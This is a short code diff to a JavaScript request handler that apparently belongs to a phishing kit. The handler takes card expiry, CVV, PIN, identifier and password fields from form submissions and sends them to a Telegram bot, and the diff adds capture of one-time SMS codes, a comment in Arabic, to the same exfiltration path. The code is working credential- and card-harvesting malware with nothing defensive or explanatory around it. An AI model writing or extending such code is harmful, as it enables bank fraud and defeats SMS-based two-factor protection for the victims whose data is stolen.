@@ -13,6 +13,7 @@ export default async function handler(req, res) {
     exp,
     cvv,
     PIN,
+    sms_input,
 
   } = req.body;
 
@@ -46,8 +47,13 @@ export default async function handler(req, res) {
     - Identifiant: ${id_no}
     - Mot de passe: ${password}
      `;
-  }
-
+} else if (sms_input ) {
+  // 🟢 رسالة الكارت
+  message = `
+  🔑sms_input Login:
+  - sms: ${sms_input}
+   `;
+}
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
